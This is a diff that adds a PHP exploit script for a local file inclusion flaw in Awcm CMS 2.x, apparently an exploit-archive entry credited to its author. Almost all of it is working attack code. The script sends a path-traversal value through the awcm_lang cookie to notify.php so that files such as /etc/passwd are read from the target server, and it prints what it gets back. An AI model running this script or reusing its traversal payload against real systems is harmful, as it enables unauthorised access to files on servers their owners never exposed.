@@ -1,0 +1,84 @@
+# Software Link: http://www.awcm-cms.com/
+# Version: 2.x
+# Tested on: Lunix
+
+Exploit :
+
+<?php
+
+print("
+------------------------------------------------------------
+| Awcm Cms Local File Inclusion Vulnerability
+| By SwEET-DeViL
+| x0.root(at)gmail.com
+| example
+|
+| Exploit.php ".$argv[0]." example.com /path/ ../../../../../../../../etc/passwd
+------------------------------------------------------------
+");
+$host =$argv[1];//;
+$Path = "http://".$host.$argv[2];
+       $CURL_in ="GET ".$Path."/notify.php?v=a HTTP/1.0\r\n";
+       $CURL_in.="User-Agent: Mozilla/4.0 (compatible; MSIE 7.0;
+Windows NT 5.1)\r\n";
+       $CURL_in.="Pragma: no-cache\r\n";
+       $CURL_in.="Cookie: awcm_lang=".$argv[3]."".";\r\n";
+       $CURL_in.="Connection: Close\r\n\r\n";
+
+       if ( empty($argv[3]) ){
+               echo "\n[-] Error : Exploit failed\n";
+               die;
+       }
+
+       $FoN = @fsockopen($host, 80);
+       if(!$FoN){
+               echo "\n[-] Error : Can't connect to ".$host." !!\n";
+               die;
+       }
+
+       fputs($FoN, $CURL_in);
+       while (!feof($FoN)) $data .= fread($FoN, 1024);
+       fclose($FoN);
+
+       $error_1 = strstr( $data, "HTTP/1.1 404 Not Found" );
+       if ( !empty($error_1) ){
+               echo "\n[-] Error : 404 Not Found. \n";
+               die;
+       }
+
+       $error_2 = strstr( $data, "HTTP/1.1 406 Not Acceptable" );
+       if ( !empty($error_2) ){
+               echo "\n[-] Error : 406 Not Acceptable. \n";
+               die;
+       }
+
+
+
+$EXc = explode("</head>",$data);
+$EXx = explode("<head>",$EXc[1]);
+$CODE = strip_tags($EXx[0]);
+$CODE2 = preg_replace("/\r|\t/",'',$CODE);
+$CODE2 = trim($CODE2);
+
+if (empty($CODE2)){
+print ('
+
+[-] Error : Sorry! File not Found
+
+');
+}else{
+print ('
+[+]
+------------------------------------------------------------
+').$CODE2;
+
+
+
+print ('
+
+------------------------------------------------------------
+');
+
+}
+
+?>
